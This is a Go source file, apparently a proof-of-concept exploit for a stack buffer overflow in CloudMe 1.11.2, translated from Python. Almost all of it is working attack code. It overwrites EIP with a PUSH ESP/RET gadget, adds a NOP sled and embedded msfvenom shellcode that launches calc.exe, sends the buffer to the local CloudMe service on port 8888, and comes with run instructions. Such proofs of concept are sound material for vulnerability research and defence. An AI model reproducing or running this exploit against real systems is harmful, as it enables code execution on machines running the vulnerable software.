// Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
// Date: 2020-04-27
// Exploit Author: Andy Bowden
// Translated by LzByte from Python to Golang
// Vendor Homepage: https://www.cloudme.com/en
// Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
// Version: CloudMe 1.11.2
// Tested on: Windows 10 x64

//Instructions:
// Start the CloudMe service and run the script.

package main

import (
	"net"
	"os"
	"strings"
)

func main() {
	padding1 := strings.Repeat("\x90", 1052)
	EIP := "\xB5\x42\xA8\x68" // 0x68A842B5 -> PUSH ESP, RET
	NOPS := strings.Repeat("\x90", 30)
	println(NOPS)

	conn, err := net.Dial("tcp", "127.0.0.1:8888")
	if err != nil {
		println("Connection failed", err.Error())
		os.Exit(1)
	}

	//msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python -v payload
	//You have to remobe the b before " as you see bellow.

	payload := "\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
	payload += "\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
	payload += "\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f"
	payload += "\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8"
	payload += "\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f"
	payload += "\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43"
	payload += "\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee"
	payload += "\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4"
	payload += "\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a"
	payload += "\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff"
	payload += "\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33"
	payload += "\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59"
	payload += "\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05"
	payload += "\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4"
	payload += "\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6"
	payload += "\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c"
	payload += "\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f"

	overrun := strings.Repeat("C", (1500 - len(padding1+EIP+NOPS+payload)))

	buf := padding1 + EIP + NOPS + payload + overrun

	_, err = conn.Write([]byte(buf))
	if err != nil {
		println("Connection failed while sending the exploit", err.Error())
		os.Exit(1)
	}

	conn.Close()

}
